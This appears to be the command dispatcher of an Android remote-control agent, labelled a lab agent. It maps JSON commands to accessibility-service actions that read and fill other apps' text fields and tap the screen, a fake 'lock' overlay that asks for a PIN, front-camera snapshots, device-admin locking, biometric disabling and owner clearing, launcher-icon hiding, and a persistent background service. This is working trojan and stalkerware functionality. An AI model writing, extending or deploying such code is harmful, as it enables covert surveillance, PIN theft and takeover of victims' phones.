package com.ref.labagent;

import android.content.Context;
import android.content.Intent;
import android.os.Build;

import org.json.JSONArray;
import org.json.JSONObject;

/** 桥命令分发：把一条 JSON 命令落到具体能力上。 */
public class Dispatch {

    public static JSONObject run(Context c, JSONObject req) throws Exception {
        String cmd = req.optString("cmd", "");
        JSONObject out = new JSONObject();
        out.put("ok", true);
        out.put("cmd", cmd);
        AccService acc = AccService.get();

        if ("info".equals(cmd) || "ping".equals(cmd)) {
            out.put("info", Bridge.info());
            out.put("caps", Bridge.caps());
            return out;
        }

        if (cmd.startsWith("acc.")) {
            if (acc == null) {
                out.put("ok", false);
                out.put("err", "accessibility-not-connected");
                out.put("hint", "用 settings put secure enabled_accessibility_services 打开 " +
                        AccService.component(c));
                return out;
            }
            if ("acc.tree".equals(cmd)) {
                out.put("tree", acc.dumpTree(req.optInt("depth", 40)));
            } else if ("acc.edits".equals(cmd)) {
                out.put("edits", acc.readEdits());
            } else if ("acc.setText".equals(cmd)) {
                out.put("result", acc.setText(req.optString("text", "")));
            } else if ("acc.click".equals(cmd)) {
                out.put("result", acc.clickBy(req.optString("target", "")));
            } else if ("acc.gesture".equals(cmd)) {
                JSONArray pts = req.optJSONArray("points");
                int n = pts == null ? 0 : pts.length();
                float[] xs = new float[n];
                float[] ys = new float[n];
                for (int i = 0; i < n; i++) {
                    JSONArray p = pts.getJSONArray(i);
                    xs[i] = (float) p.optDouble(0, 0);
                    ys[i] = (float) p.optDouble(1, 0);
                }
                out.put("result", acc.gesture(xs, ys, req.optLong("duration", 0), null));
            } else if ("acc.global".equals(cmd)) {
                out.put("result", acc.global(req.optString("name", "home")));
            } else if ("acc.foreground".equals(cmd)) {
                out.put("pkg", acc.foregroundPkg());
            } else {
                out.put("ok", false);
                out.put("err", "unknown-acc-cmd");
            }
            return out;
        }

        if (cmd.startsWith("overlay.")) {
            if ("overlay.show".equals(cmd)) {
                final String ty = req.optString("type", "lock");
                final String ti = req.optString("title", "");
                final String di = req.optString("disclaimer", "");
                final int pin = req.optInt("pin", 6);
                Object r = Bridge.runOnMain(new java.util.concurrent.Callable<Object>() {
                    public Object call() { return Overlay.show(null, ty, ti, di, pin); }
                }, 8000);
                out.put("result", String.valueOf(r));
            } else if ("overlay.close".equals(cmd)) {
                Object r = Bridge.runOnMain(new java.util.concurrent.Callable<Object>() {
                    public Object call() { return Overlay.close(); }
                }, 5000);
                out.put("result", String.valueOf(r));
            } else if ("overlay.state".equals(cmd)) {
                out.put("showing", Overlay.isShowing());
                out.put("canDraw", Overlay.canDraw(c));
            } else {
                out.put("ok", false);
                out.put("err", "unknown-overlay-cmd");
            }
            return out;
        }

        if (cmd.startsWith("cam.")) {
            if ("cam.open".equals(cmd)) {
                final Context cc = c;
                final int face = req.optInt("face", 1);
                Object r = Bridge.runOnMain(new java.util.concurrent.Callable<Object>() {
                    public Object call() { return Cam.open(cc, face); }
                }, 9000);
                out.put("result", String.valueOf(r));
            } else if ("cam.still".equals(cmd)) {
                out.put("shot", Cam.still(c, req.optInt("face", 1), req.optInt("wait", 4000)));
            } else if ("cam.close".equals(cmd)) {
                out.put("result", Cam.close());
            } else if ("cam.state".equals(cmd)) {
                out.put("state", Cam.state());
            } else {
                out.put("ok", false);
                out.put("err", "unknown-cam-cmd");
            }
            return out;
        }

        if (cmd.startsWith("admin.")) {
            if ("admin.enable".equals(cmd)) {
                AdminReceiver.request(c);
                out.put("result", "requested");
            } else if ("admin.disable".equals(cmd)) {
                out.put("result", AdminReceiver.remove(c));
            } else if ("admin.active".equals(cmd)) {
                out.put("active", AdminReceiver.isActive(c));
                out.put("owner", AdminReceiver.isOwner(c));
            } else if ("admin.clearOwner".equals(cmd)) {
                out.put("result", AdminReceiver.clearOwner(c));
            } else if ("admin.lock".equals(cmd)) {
                out.put("result", AdminReceiver.lock(c));
            } else if ("admin.biometric".equals(cmd)) {
                out.put("result", AdminReceiver.setBiometric(c, req.optBoolean("disabled", true)));
            } else {
                out.put("ok", false);
                out.put("err", "unknown-admin-cmd");
            }
            return out;
        }

        if (cmd.startsWith("app.")) {
            String pkg = req.optString("pkg", "");
            if ("app.launch".equals(cmd)) {
                // 由 App 自己解析启动意图并拉起（shell 侧 `cmd package resolve-activity` 在
                // root/magisk 上下文里会回 "No activity found"，实测；App 这边有正常的包可见性）
                Intent it = c.getPackageManager().getLaunchIntentForPackage(pkg);
                if (it == null) {
                    out.put("ok", false);
                    out.put("err", "no-launch-intent");
                    out.put("pkg", pkg);
                    return out;
                }
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                c.startActivity(it);
                out.put("result", "started");
                out.put("component", String.valueOf(it.getComponent()));
                return out;
            }
            if ("app.info".equals(cmd)) {
                out.put("label", String.valueOf(c.getPackageManager()
                        .getApplicationLabel(c.getPackageManager().getApplicationInfo(pkg, 0))));
                return out;
            }
            if ("app.icon".equals(cmd)) {
                // 真图标：PackageManager 取 Drawable -> Bitmap -> PNG -> base64
                // （shell 侧 `pm path` + unzip 在这些包上取不到 —— 实测 split APK / 系统包都不命中）
                android.graphics.drawable.Drawable d =
                        c.getPackageManager().getApplicationIcon(pkg);
                int w = Math.max(1, d.getIntrinsicWidth());
                int h = Math.max(1, d.getIntrinsicHeight());
                android.graphics.Bitmap bm =
                        android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888);
                android.graphics.Canvas cv = new android.graphics.Canvas(bm);
                d.setBounds(0, 0, w, h);
                d.draw(cv);
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                bm.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, bos);
                out.put("icon", android.util.Base64.encodeToString(
                        bos.toByteArray(), android.util.Base64.NO_WRAP));
                out.put("bytes", bos.size());
                out.put("w", w);
                out.put("h", h);
                return out;
            }
            if ("app.apkPath".equals(cmd)) {
                out.put("path", String.valueOf(
                        c.getPackageManager().getApplicationInfo(pkg, 0).sourceDir));
                return out;
            }
            out.put("ok", false);
            out.put("err", "unknown-app-cmd");
            return out;
        }

        if ("perm.status".equals(cmd)) {
            out.put("status", Perms.status(c));
            out.put("overlay", Overlay.canDraw(c));
            return out;
        }
        if ("alias.set".equals(cmd)) {
            out.put("result", Bridge.setAlias(c, req.optString("mode", "hide")));
            return out;
        }
        if ("svc.start".equals(cmd)) {
            Intent i = new Intent(c, AgentService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                c.startForegroundService(i);
            } else {
                c.startService(i);
            }
            out.put("result", "started");
            return out;
        }
        out.put("ok", false);
        out.put("err", "unknown-cmd");
        return out;
    }
}
